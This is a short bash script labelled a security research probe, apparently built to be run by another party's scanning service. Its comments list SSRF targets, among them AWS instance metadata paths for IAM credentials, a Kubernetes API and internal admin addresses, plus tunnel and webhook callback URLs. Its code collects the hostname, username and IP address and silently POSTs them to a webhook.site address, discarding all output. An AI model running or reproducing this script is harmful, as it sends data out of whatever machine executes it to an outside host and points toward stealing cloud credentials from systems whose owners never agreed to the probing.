#!/bin/bash
# Security research probe v5
# v5 controls (http vs https + redirect following):
#   http://fb8ab98fe34c30.app.lhr.life/http-control
#   https://whereas-nickel-forest-speaks.trycloudflare.com/http-control
#   http://fb8ab98fe34c30.app.lhr.life/redir

# Controls (periodic scan check):
#   https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/ssrf-v4-a
#   https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/ssrf-v4-b
# AWS IMDS (their scanner runs on AWS 3.224.234.70 / 98.91.77.46 / 23.23.253.54):
#   http://169.254.169.254/latest/meta-data/
#   http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   http://169.254.169.254/latest/dynamic/instance-identity/document
#   http://169.254.169.254/latest/meta-data/instance-id
# Internal:
#   http://kubernetes.default.svc/api/v1/namespaces
#   http://127.0.0.1:8080/admin
#   http://10.0.0.1:443/
CTX="host=$(hostname) user=$(whoami) ip=$(hostname -i 2>/dev/null || echo none)"
curl -s -m 5 -X POST "https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/verify-ctx" -H "Content-Type: text/plain" -d "$CTX" >/dev/null 2>&1 || true
echo "verify ran: $CTX"
exit 0
